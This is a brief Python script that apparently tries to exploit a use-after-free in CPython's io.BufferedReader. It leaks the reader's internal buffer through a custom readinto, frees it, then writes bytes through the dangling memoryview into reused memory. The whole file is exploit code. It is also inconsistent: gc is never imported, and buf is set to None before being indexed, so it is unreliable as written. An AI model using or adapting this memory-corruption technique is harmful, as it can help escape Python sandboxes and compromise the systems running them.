import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f
buf = view
#obtain uaf object

print(buf[:])
print(type(buf))
#clear gc
print("CLEAR")
view = 0
buf = None
view = None
gc.collect()
f = io.BufferedReader(File())
print("CLEAR")
f.read(1)
view = 0
buf = None
view = None
gc.collect()
f.close()

#create fd, open
fd = open(file="f.txt", mode="wb")
#expected REFC

print("CLEAR")
f = 0
del f
view = 0
buf = None
view = None
gc.collect()
#expected REFC

buf[0] = ord("H")
#expected REFC

print("SET")
print("CLEAR")
f = 0
del f
view = 0
buf = None
view = None
gc.collect()


buf[1] = ord("I")
print("SET")
#expected REFC

print("CLEAR")
f = 0
del f
view = 0
